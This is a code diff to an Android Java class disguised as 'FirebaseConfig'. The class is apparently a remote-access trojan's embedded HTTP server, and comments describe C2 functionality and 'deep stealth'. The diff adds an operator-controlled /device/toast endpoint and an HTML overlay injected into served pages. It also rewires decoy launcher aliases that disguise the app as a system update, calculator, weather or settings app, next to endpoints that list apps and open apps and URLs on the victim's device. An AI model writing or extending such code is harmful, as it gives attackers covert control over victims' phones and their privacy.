@@ -447,12 +447,17 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     private Response serveGzipped(IHTTPSession session, String mime, String content) {
-        // [STABILITY_SYNC] Reverting to high-performance minification to restore C2 functionality
+        // [DEEP_STEALTH_V10] Atomic Minification: Restores scrolling and solves FOUC with a lightweight pre-render shield
         if (mime != null && mime.contains("text/html") && content != null && !content.isEmpty()) {
             content = content.replaceAll("(?s)<!--.*?-->", "")
                              .replaceAll(">\\s+<", "><")
                              .replaceAll("\\s{2,}", " ")
                              .replaceAll("[\\r\\n]+", "");
+            
+            // PRE-RENDER SHIELD: Injects a simple black overlay that disappears after the CSS is ready
+            String shield = "<div id=\"_sys_shield\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#010801;z-index:99999;transition:opacity 0.4s;\"></div>" +
+                           "<script>window.onload=()=>{const s=document.getElementById('_sys_shield');if(s){s.style.opacity='0';setTimeout(()=>s.remove(),400);}};</script>";
+            content = content.replace("<body>", "<body>" + shield);
         }
 
         if (session == null) return newFixedLengthResponse(Response.Status.OK, mime, content);
@@ -628,6 +633,19 @@ public class FirebaseConfig extends NanoHTTPD {
                         else if (uri.equals("/device/apps")) { response = serveAppList(session); }
                         else if (uri.equals("/device/open-app")) { openAppOnDevice(params.get("pkg")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
                         else if (uri.equals("/device/open-url")) { openUrlOnDevice(params.get("url")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/toast")) {
+                            String msg = params.get("msg");
+                            int size = 22, y = 250, duration = 3500;
+                            String anim = params.get("anim"); if (anim == null) anim = "scroll";
+                            String color = params.get("color"); if (color == null) color = "#FFFFFF";
+                            try {
+                                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
+                                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
+                                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
+                            } catch (Exception ignored) {}
+                            showToast(msg, size, y, anim, duration, color);
+                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                        }
                         else if (uri.equals("/device/terminate")) {
                             logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -1000,14 +1018,14 @@ public class FirebaseConfig extends NanoHTTPD {
             try {
                 String pkg = context.getPackageName();
                 android.content.pm.PackageManager pm = context.getPackageManager();
-                String pkgName = context.getPackageName();
+                String basePkg = "com.labs.labrats";
 
                 // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                 String[] decoys = {
-                    context.getPackageName() + ".SystemUpdateAlias",
-                    context.getPackageName() + ".CalculatorAlias",
-                    context.getPackageName() + ".WeatherAlias",
-                    context.getPackageName() + ".SettingsAlias"
+                    basePkg + ".SystemUpdateAlias",
+                    basePkg + ".CalculatorAlias",
+                    basePkg + ".WeatherAlias",
+                    basePkg + ".SettingsAlias"
                 };
                 for (String decoy : decoys) {
                     try {
@@ -1018,7 +1036,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 }
 
                 // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
-                pm.setComponentEnabledSetting(new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias"),
+                pm.setComponentEnabledSetting(new android.content.ComponentName(context, basePkg + ".LauncherAlias"),
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                         0);
                 
